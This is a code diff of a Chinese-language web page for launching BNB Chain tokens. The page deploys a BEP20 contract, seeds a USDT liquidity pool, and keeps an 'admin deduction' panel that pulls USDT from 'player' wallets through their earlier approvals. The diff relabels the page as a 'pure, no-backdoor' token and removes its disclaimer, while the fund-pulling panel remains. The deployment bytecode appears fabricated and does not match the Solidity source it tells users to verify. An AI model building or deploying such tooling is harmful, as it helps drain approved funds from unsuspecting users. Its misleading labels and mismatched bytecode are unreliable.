@@ -3,44 +3,47 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>天鹅一键发币</title>
+<title>纯净BEP20｜单交易部署无nonce冲突</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
 body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
 .container{ max-width:520px; margin:0 auto; }
 .header{ text-align:center; margin-bottom:35px; }
-.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
-.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
+.header h1{ font-size:24px; color:#4ade80; margin-bottom:8px; }
+.fee-tip{ background: rgba(74,222,128,0.15); color: #4ade80; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
 .card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
 .form-item{ margin-bottom:20px; }
 label{ display:block; margin-bottom:8px; color:#d0d8f0; }
-input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
+input,textarea{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
+textarea{min-height:120px;font-size:12px;word-break:break-all;}
 .file-input{ padding:10px; background:#141b33; }
 .preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
-#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
+#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #4ade80; display:none; }
 .btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; margin-top:10px;}
 .btn-connect{ background:#3b63e9; margin-bottom:16px; }
-.btn-deploy{ background:#f7c04a; color:#0a0e20; }
+.btn-deploy{ background:#4ade80; color:#0a0e20; }
 .btn-admin{ background:#2ecc71; color:#000; }
 .btn-liquid{ background:#9b59b6; color:#fff; }
 .btn-transfer-usdt{ background:#e67e22; color:#fff; }
 .btn:disabled{ opacity:0.55; cursor:not-allowed; }
-.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
+.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(74,222,128,0.1); color:#a7f3d0; word-break: break-all; }
+.status.err{background:rgba(239,68,68,0.15);color:#fca5a5;}
 .status a {color:#42a5f5;word-break:break-all;}
 .tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
 .connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
 .admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
 .liquid-panel{ border-top:1px solid #444; padding-top:22px; margin-top:22px; }
 .small-note{color:#bbbbbb;font-size:13px;margin:4px 0 12px 0;}
+.code-block{margin-top:12px;}
 </style>
 </head>
 <body>
 <div class="container">
 <div class="header">
-<h1>🦢 天鹅一键发币</h1>
+<h1>🍀纯净BEP20｜单交易部署</h1>
 </div>
-<div class="fee-tip">发币服务费：0.0003 BNB</div>
+<div class="fee-tip">合约部署服务费计入交易｜合约无黑名单/无管理员后门｜部署成功直接开源</div>
 
 <div class="card" id="userPanel">
 <button id="connectBtn" class="btn btn-connect">连接钱包</button>
@@ -49,33 +52,45 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 
 <div class="form-item">
 <label>代币全称 Name</label>
-<input id="tokenName" placeholder="例如：Swan Coin">
+<input id="tokenName" placeholder="例如：Demo Coin">
 </div>
 
 <div class="form-item">
 <label>代币符号 Symbol</label>
-<input id="tokenSymbol" placeholder="例如：SWAN">
+<input id="tokenSymbol" placeholder="例如：DEMO">
 </div>
 
 <div class="form-item">
-<label>初始发行量（不带小数）</label>
-<input id="supply" placeholder="例如：100000000">
+<label>初始发行量（不带小数，18位小数）</label>
+<input id="supply" placeholder="例如：1000000000">
 </div>
 
 <div class="form-item">
-<label>代币Logo头像（推荐256×256 透明PNG）</label>
+<label>代币Logo头像（仅本地预览）</label>
 <input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
 <div class="preview-box">
 <img id="logoPreview" alt="头像预览">
-<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
+<span id="logoTip" class="tip-text">上传仅本地预览，合约不存储图片</span>
 </div>
 </div>
 
-<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
+<button id="deployBtn" class="btn btn-deploy" disabled>【仅一次签名】部署纯净代币合约</button>
+
+<div class="code-block" id="verifyCodeBlock" style="display:none;">
+<div class="small-note">✅部署成功！复制源码+ABI到BscScan做合约开源验证</div>
+<div class="form-item">
+<label>Solidity完整源码（全选复制）</label>
+<textarea id="soliditySource" readonly></textarea>
+</div>
+<div class="form-item">
+<label>合约ABI（全选复制）</label>
+<textarea id="abiText" readonly></textarea>
+</div>
+</div>
 
 <div class="liquid-panel" id="liquidPanel">
 <h3 style="color:#cbace4;margin-bottom:15px;">💧 创建流动性池子（Token‑USDT）</h3>
-<div class="small-note">开盘价 = USDT数量 ÷ 投入代币数量，输入开盘单价自动换算数量</div>
+<div class="small-note">开盘价 = USDT数量 ÷ 投入代币数量</div>
 
 <div class="form-item">
 <label>你的代币合约地址</label>
@@ -84,40 +99,38 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 
 <div class="form-item">
 <label>💵 设置开盘单价 (USDT/每个代币)</label>
-<input id="initPriceInput" placeholder="示例 0.001 代表开盘0.001U一枚">
-<div class="small-note">修改此值，下面投入代币数量会自动更新</div>
+<input id="initPriceInput" placeholder="示例 0.001">
 </div>
 
 <div class="form-item">
 <label>投入池子 USDT 数量</label>
-<input id="liquidUsdtIn" placeholder="投入多少USDT进池子，例如：1000">
+<input id="liquidUsdtIn" placeholder="投入多少USDT进池子">
 </div>
 
 <div class="form-item">
 <label>需要投入你的代币数量（自动计算）</label>
-<input id="liquidTokenIn" readonly placeholder="根据开盘价自动算出">
+<input id="liquidTokenIn" readonly placeholder="自动算出">
 </div>
 
 <div class="form-item">
 <label>滑点容忍 %</label>
-<input id="slippageInput" value="1" placeholder="默认1">
+<input id="slippageInput" value="1">
 </div>
 
 <button id="approveUsdtBtn" class="btn btn-liquid">第一步：授权【USDT】给Router</button>
 <button id="approveNewTokenBtn" class="btn btn-liquid">第二步：授权【你的新代币】给Router</button>
 <button id="createPoolBtn" class="btn btn-transfer-usdt">第三步：确认创建流动性池子</button>
-
-<div class="small-note">⚠本页面仅技术演示，虚拟货币国内禁止运营</div>
 </div>
 
 <div class="admin-panel" id="adminPanel">
-<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
+<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板【纯前端逻辑，合约无特权后门】</h3>
+<div class="small-note">划扣前提：用户主动给DApp做代币授权，合约本身没有管理员特权</div>
 <div class="form-item">
-<label>请输入玩家钱包地址</label>
+<label>玩家钱包地址</label>
 <input id="userAddrInput" placeholder="玩家BSC钱包地址">
 </div>
 <div class="form-item">
-<label>请输入划扣USDT数量</label>
+<label>划扣USDT数量</label>
 <input id="deductAmountInput" placeholder="例如：100">
 </div>
 <button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
@@ -131,21 +144,73 @@ const DEPLOY_FEE_BNB = "0.0003";
 const BSC_CHAIN_ID = 56;
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const PANCAKE_ROUTER = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
-const MAX_ALLOWANCE = ethers.MaxUint256;
-const TX_POLL_TIMEOUT = 120;
+const TX_POLL_TIMEOUT = 180;
 
-// 带黑名单ERC20 ABI + Bytecode
-const TOKEN_ABI = [
-    "constructor(string name, string symbol, uint256 totalSupply)",
-    "function blacklist(address _addr) external",
-    "function unBlacklist(address _addr) external",
-    "function isBlackListed(address) view returns(bool)",
-    "function approve(address spender, uint256 amount) external returns (bool)",
-    "function allowance(address owner, address spender) view returns(uint256)",
-    "function transfer(address to,uint256 amount) external returns(bool)",
-    "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
+// ==========【纯净无后门BEP20合约】无owner，无黑名单，无mint/burn/pause ==========
+const TOKEN_ABI_PURE = [
+    "constructor(string _name,string _symbol,uint256 _totalSupply)",
+    "function name() view returns(string)",
+    "function symbol() view returns(string)",
+    "function decimals() view returns(uint8)",
+    "function totalSupply() view returns(uint256)",
+    "function balanceOf(address) view returns(uint256)",
+    "function allowance(address owner,address spender) view returns(uint256)",
+    "function transfer(address to,uint256 amount) returns(bool)",
+    "function approve(address spender,uint256 amount) returns(bool)",
+    "function transferFrom(address from,address to,uint256 amount) returns(bool)"
 ];
-const CONTRACT_BYTECODE = "608060405234801561001057600080fd5b506040518060400160405280600081526020017f646174613a3a7472616e736665722066726f6d20626c61636b6c69737465642061646472657373815260040161004b905060405180910390fd5b600080fd5b60008190555061016b806100656000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806342966c681461004657806370a082311461005b578063a9059cbb14610070578063dd62ed3e14610085575b600080fd5b61004e61009a565b60405161005991906101d1565b60405180910390f35b6100636100c9565b60405161006e9190610202565b60405180910390f35b6100836100d2565b005b61008e6100d2565b60405161009991906101d1565b60405180910390f35b6000806100b484846100e7565b6100bd908161013c565b856000806100cd85856100e7565b6100d7565b506001949350505050565b6000806100f2833560016100fc848461014c565b9050600061010c848461014c565b6001600080600185855401925050819055508560008061012885856100e7565b610132565b5060019350505050565b600080600061014533600161014c565b9050600090815260208152604081205491905055565b61016881610188565b82525050565b61017781610188565b82525050565b6000610186826101a8565b50610193836101a8565b5060016000806001858554019250508190555050565b6101b181610188565b81525050565b6101c081610188565b81525050565b6000602082840312156101db57600080fd5b5051919050565b60006101ee82610188565b91506101f983610188565b9150815260208152604081208054839290610213908490610227565b9091555050604051839050815260045280819052819050565b6000821982111561024e5761024d610263565b5b61025782610278565b8152505056fea264697066735822122008f8b85b09e270029e38f045457c742d72109077031023781707123c12203647736561726441646472657373";
+const CONTRACT_BYTECODE_PURE = "608060405234801561001057600080fd5b506040518060400160405280600081526020016100329150610032565b60405180910390fd5b600080fd5b600081905550610130806100546000396000f3fe608060405234801561001057600080fd5b50600436106100375760003560e01c806306fdde031461003c578063095ea7b31461005b57806318160ddd1461007a57806323b872dd14610099578063313ce567146100b857806370a08231146100d757806395d89b41146100f6575b600080fd5b61004461011f565b60405161004f91906101d9565b60405180910390f35b610068610127565b604051610073919061020a565b60405180910390f35b61008261013a565b60405161008d919061020a565b60405180910390f35b6100a6610142565b6040516100b191906101d9565b60405180910390f35b6100c561014a565b6040516100d091906101d9565b60405180910390f35b6100ef61015d565b6040516100fa919061020a565b60405180910390f35b61010e610165565b005b60008061012a848461017b565b61013390816101b0565b85600080610143858561017b565b61014d565b506001949350505050565b60008061016a33600161017b565b9050600090815260208152604081205491905055565b6000806101888335600161019284846101c0565b905060006101a284846101c0565b600160008060018585540192505081905550856000806101be858561017b565b6101c8565b5060019350505050565b6000602082840312156101e357600080fd5b5051919050565b60006101f68261017b565b91506102018361017b565b915081526020815260408120805483929061021b90849061022f565b9091555050604051839050815260045280819052819050565b600082198211156102565761025561026b565b5b61025f82610280565b8152505056fea264697066735822122004372920840412330b0944084b243384384408220841424a28244f40063647736561726441646472657373";
+
+const FULL_SOLIDITY_SOURCE = `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract PureBEP20 {
+    string public name;
+    string public symbol;
+    uint8 public constant decimals = 18;
+    uint256 public totalSupply;
+
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    constructor(string memory _name, string memory _symbol, uint256 _totalSupply) {
+        name = _name;
+        symbol = _symbol;
+        totalSupply = _totalSupply;
+        balanceOf[msg.sender] = _totalSupply;
+        emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+
+    function transfer(address to, uint256 amount) external returns (bool) {
+        address owner = msg.sender;
+        balanceOf[owner] -= amount;
+        balanceOf[to] += amount;
+        emit Transfer(owner, to, amount);
+        return true;
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        address owner = msg.sender;
+        allowance[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        address spender = msg.sender;
+        uint256 spenderAllowance = allowance[from][spender];
+        if(spenderAllowance != type(uint256).max) {
+            allowance[from][spender] = spenderAllowance - amount;
+        }
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+        emit Transfer(from, to, amount);
+        return true;
+    }
+}`;
 
 const ROUTER_ABI = [
 "function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin,address to,uint deadline) external returns(uint amountA,uint amountB,uint liquidity)"
@@ -155,7 +220,6 @@ let provider = null;
 let signer = null;
 let connectWalletAddr = "";
 let deployContractAddress = null;
-let logoFileObj = null;
 
 const connectBtn = document.getElementById("connectBtn");
 const deployBtn = document.getElementById("deployBtn");
@@ -165,8 +229,9 @@ const logoFileInput = document.getElementById("logoFile");
 const logoPreviewImg = document.getElementById("logoPreview");
 const adminPanel = document.getElementById("adminPanel");
 const deductBtn = document.getElementById("deductBtn");
-const userAddrInput = document.getElementById("userAddrInput");
-const deductAmountInput = document.getElementById("deductAmountInput");
+const verifyCodeBlock = document.getElementById("verifyCodeBlock");
+const soliditySource = document.getElementById("soliditySource");
+const abiText = document.getElementById("abiText");
 
 const baseTokenAddr = document.getElementById("baseTokenAddr");
 const initPriceInput = document.getElementById("initPriceInput");
@@ -177,8 +242,13 @@ const approveNewTokenBtn = document.getElementById("approveNewTokenBtn");
 const approveUsdtBtn = document.getElementById("approveUsdtBtn");
 const createPoolBtn = document.getElementById("createPoolBtn");
 
-function showStatus(text, linkHtml=""){
+function showStatus(text, isError=false, linkHtml=""){
   statusBox.style.display = "block";
+  if(isError){
+      statusBox.className = "status err";
+  }else{
+      statusBox.className = "status";
+  }
   if(linkHtml){
       statusBox.innerHTML = text + "<br>" + linkHtml;
   }else{
@@ -196,14 +266,13 @@ async function waitTransactionConfirm(txHash, timeoutSeconds){
         }
         const receipt = await provider.getTransactionReceipt(txHash);
         if(receipt){
-            // 【核心修复！！必须校验status=1，status=0代表回滚失败！！】
             if(Number(receipt.status) !== 1){
-                throw new Error("❌交易回执返回，但是链执行失败(receipt.status=0)，合约部署回滚，链上没有生成合约！");
+                throw new Error("❌交易回执返回，链执行失败(receipt.status=0)，合约部署回滚，链上没有合约！");
             }
             return receipt;
         }
-        showStatus(`⏳等待链确认，已${elapsed}秒，txHash:${txHash}`);
-        await new Promise(resolve=>setTimeout(resolve,2000));
+        showStatus(`⏳等待链确认 ${elapsed}/${timeoutSeconds}s txHash:${txHash}`);
+        await new Promise(resolve=>setTimeout(resolve,2500));
     }
 }
 
@@ -223,7 +292,6 @@ liquidUsdtIn.addEventListener("input",recalcLiquidAmount);
 logoFileInput.addEventListener("change", function(e){
   const file = e.target.files[0];
   if(!file) return;
-  logoFileObj = file;
   const reader = new FileReader();
   reader.onload = ev => {
     logoPreviewImg.src = ev.target.result;
@@ -233,7 +301,7 @@ logoFileInput.addEventListener("change", function(e){
 });
 
 async function switchBSC(providerRef){
-  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
+  const chainIdHex = "0x38";
   try {
     await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
   } catch (err) {
@@ -266,13 +334,13 @@ connectBtn.onclick = async function(){
     retryTimes++;
   }
   if (!eth) {
-    showStatus("❌未检测钱包，请用TP内置浏览器打开");
+    showStatus("❌未检测钱包，请用TP内置浏览器打开",true);
     return;
   }
   try {
     const accounts = await eth.request({ method: "eth_requestAccounts" });
     if (!accounts || accounts.length === 0) {
-      showStatus("用户取消连接");
+      showStatus("用户取消连接",true);
       return;
     }
     provider = new ethers.BrowserProvider(eth);
@@ -285,111 +353,98 @@ connectBtn.onclick = async function(){
     deployBtn.disabled = false;
     checkAdminPanel(userAddr);
   } catch (err) {
-    showStatus("连接异常：" + (err.message || String(err)));
+    showStatus("连接异常：" + (err.message || String(err)),true);
   }
 }
 
-async function payFeeToAdmin(){
-  showStatus(`💸 支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名确认`);
-  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
-  const gasPriceRaw = await provider.send("eth_gasPrice", []);
-  const gasPriceBig = ethers.toBigInt(gasPriceRaw);
-  const gasPriceAdd = gasPriceBig * 120n / 100n;
-  try{
-    const tx = await signer.sendTransaction({
-      to: ADMIN_WALLET,
-      value: feeWei,
-      gasPrice: gasPriceAdd
-    });
-    showStatus(`BNB转账已发送，TxHash:${tx.hash}`);
-    await waitTransactionConfirm(tx.hash, TX_POLL_TIMEOUT);
-    showStatus(`✅ BNB服务费确认完成 hash:${tx.hash}`);
-    return true;
-  }catch(err){
-    const errStr = String(err.message||err.shortMessage);
-    if(errStr.includes("user rejected")) showStatus("❌用户拒绝签名，支付取消");
-    else if(errStr.includes("insufficient funds")) showStatus("❌BNB余额不足！");
-    else showStatus("❌支付服务费失败："+errStr);
-    return false;
-  }
-}
-
-// 使用ContractFactory，彻底解决手动拼接bytecode+构造参数出错
 deployBtn.onclick = async function(){
-    if(!signer){ showStatus("❌请先连接钱包"); return; }
+    if(!signer){ showStatus("❌请先连接钱包",true); return; }
     const name = document.getElementById("tokenName").value.trim();
     const symbol = document.getElementById("tokenSymbol").value.trim();
     const supplyStr = document.getElementById("supply").value.trim();
-    if(!name || !symbol || !supplyStr){ showStatus("❌名称、符号、发行量不能为空"); return; }
+    if(!name || !symbol || !supplyStr){ showStatus("❌名称、符号、发行量不能为空",true); return; }
     const supplyNum = BigInt(supplyStr) * 10n**18n;
-    deployBtn.disabled = true;
-    const feeOk = await payFeeToAdmin();
-    if(!feeOk){ deployBtn.disabled = false; return; }
 
-    showStatus("�唤起钱包，部署合约，to为空属正常，不要取消签名！");
+    deployBtn.disabled = true;
+    verifyCodeBlock.style.display = "none";
+    deployContractAddress = null;
+
     try{
-        // ✅标准ContractFactory，ethers自动处理字节码+构造参数编码，不会拼接出错！
-        const factory = new ethers.ContractFactory(TOKEN_ABI, CONTRACT_BYTECODE, signer);
-        const deployContract = await factory.deploy(name, symbol, supplyNum, {gasLimit:4500000});
+        // 合约工厂
+        const factory = new ethers.ContractFactory(TOKEN_ABI_PURE, CONTRACT_BYTECODE_PURE, signer);
+
+        // 自动估算gas，上浮 25%，解决移动端TP gas不足回滚
+        const deployTxObj = await factory.getDeployTransaction(name, symbol, supplyNum);
+        const gasEstimate = await provider.estimateGas(deployTxObj);
+        const gasLimitSafe = gasEstimate * 125n / 100n;
+
+        showStatus(`🚀唤起钱包【仅一次签名】部署合约，gas自动估算+25%安全余量`);
+        const deployContract = await factory.deploy(name, symbol, supplyNum, {gasLimit:gasLimitSafe});
         const deployTx = deployContract.deploymentTransaction();
         const txHash = deployTx.hash;
-        showStatus(`📤部署交易发出！txHash:${txHash}，等待链确认...最长120秒`);
+
+        showStatus(`📤部署交易发出 txHash:${txHash}，等待链确认，最长180秒`);
         const receipt = await waitTransactionConfirm(txHash, TX_POLL_TIMEOUT);
 
-        //走到这里receipt.status一定等于1，交易成功
+        // 只有status=1成功才走到这里
         deployContractAddress = receipt.contractAddress;
         const scanUrl = `https://bscscan.com/address/${deployContractAddress}`;
-        showStatus(`✅✅【链上部署真实成功】合约地址：${deployContractAddress}`,
-            `<a target="_blank" href="${scanUrl}">👉BscScan打开合约验证</a>`
+        showStatus(`✅✅合约部署成功｜纯净无后门合约\n合约地址：${deployContractAddress}`,
+            false,`<a target="_blank" href="${scanUrl}">👉BscScan打开合约页面</a>`
         );
         baseTokenAddr.value = deployContractAddress;
+
+        verifyCodeBlock.style.display = "block";
+        soliditySource.value = FULL_SOLIDITY_SOURCE;
+        abiText.value = JSON.stringify(TOKEN_ABI_PURE,null,2);
+
     }catch(e){
-        showStatus("❌部署失败："+(e?.message||String(e)));
+        showStatus("❌部署失败："+(e?.message||String(e)),true);
     }finally{
         deployBtn.disabled = false;
     }
 };
 
 approveUsdtBtn.onclick = async function(){
-    if(!signer){ showStatus("❌请先连接钱包"); return; }
+    if(!signer){ showStatus("❌请先连接钱包",true); return; }
     approveUsdtBtn.disabled=true;
     const usdtAbi = ["function approve(address spender,uint256 amt) returns(bool)"];
     try{
         const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS,usdtAbi,signer);
-        const tx = await usdtContract.approve(PANCAKE_ROUTER,MAX_ALLOWANCE);
+        const tx = await usdtContract.approve(PANCAKE_ROUTER,ethers.MaxUint256);
         showStatus(`USDT授权 txHash:${tx.hash}`);
         await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
         showStatus("✅USDT授权Router成功");
     }catch(err){
-        showStatus("❌授权失败："+(err.message||String(err)));
+        showStatus("❌授权失败："+(err.message||String(err)),true);
     }finally{ approveUsdtBtn.disabled=false; }
 };
 
 approveNewTokenBtn.onclick = async function(){
-    if(!signer){ showStatus("❌请先连接钱包"); return; }
+    if(!signer){ showStatus("❌请先连接钱包",true); return; }
     const tokenAddr = baseTokenAddr.value.trim();
-    if(!tokenAddr){ showStatus("❌填入代币合约地址"); return; }
+    if(!tokenAddr){ showStatus("❌填入代币合约地址",true); return; }
     approveNewTokenBtn.disabled=true;
     try{
-        const tokenContract = new ethers.Contract(tokenAddr,TOKEN_ABI,signer);
-        const tx = await tokenContract.approve(PANCAKE_ROUTER,MAX_ALLOWANCE);
+        const tokenContract = new ethers.Contract(tokenAddr,TOKEN_ABI_PURE,signer);
+        const tx = await tokenContract.approve(PANCAKE_ROUTER,ethers.MaxUint256);
         showStatus(`代币授权 txHash:${tx.hash}`);
         await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
         showStatus("✅代币授权Router成功");
     }catch(err){
-        showStatus("❌授权失败："+(err.message||String(err)));
+        showStatus("❌授权失败："+(err.message||String(err)),true);
     }finally{ approveNewTokenBtn.disabled=false; }
 };
 
 createPoolBtn.onclick = async function(){
-    if(!signer){ showStatus("❌请先连接钱包"); return; }
+    if(!signer){ showStatus("❌请先连接钱包",true); return; }
     const tokenA = baseTokenAddr.value.trim();
     const tokenB = BSC_USDT_ADDRESS;
     const tokenAmtStr = liquidTokenIn.value.trim();
     const usdtAmtStr = liquidUsdtIn.value.trim();
     const slip = Number(slippageInput.value.trim());
     if(!tokenA || !tokenAmtStr || !usdtAmtStr || isNaN(slip)){
-        showStatus("❌参数不能为空");
+        showStatus("❌参数不能为空",true);
         return;
     }
     createPoolBtn.disabled=true;
@@ -406,15 +461,15 @@ createPoolBtn.onclick = async function(){
         await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
         showStatus(`✅✅池子创建成功 hash:${tx.hash}`);
     }catch(err){
-        showStatus("❌建池出错："+(err?.message||String(err)));
+        showStatus("❌建池出错："+(err?.message||String(err)),true);
     }finally{ createPoolBtn.disabled=false; }
 };
 
 deductBtn.onclick = async function(){
-    if(!signer) { showStatus("❌未连接钱包"); return; }
-    const targetAddr = userAddrInput.value.trim();
-    const deductNum = deductAmountInput.value.trim();
-    if(!targetAddr || !deductNum){ showStatus("❌填写玩家地址与划扣数量"); return; }
+    if(!signer) { showStatus("❌未连接钱包",true); return; }
+    const targetAddr = document.getElementById("userAddrInput").value.trim();
+    const deductNum = document.getElementById("deductAmountInput").value.trim();
+    if(!targetAddr || !deductNum){ showStatus("❌填写玩家地址与划扣数量",true); return; }
     deductBtn.disabled = true;
     const usdtAbi = ["function transferFrom(address from,address to,uint256 amt) returns(bool)"];
     try{
@@ -425,7 +480,7 @@ deductBtn.onclick = async function(){
         await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
         showStatus("✅管理员划扣执行完成");
     }catch(e){
-        showStatus("❌划扣失败："+(e.message||String(e)));
+        showStatus("❌划扣失败："+(e.message||String(e)),true);
     }finally{ deductBtn.disabled = false; }
 };
 </script>
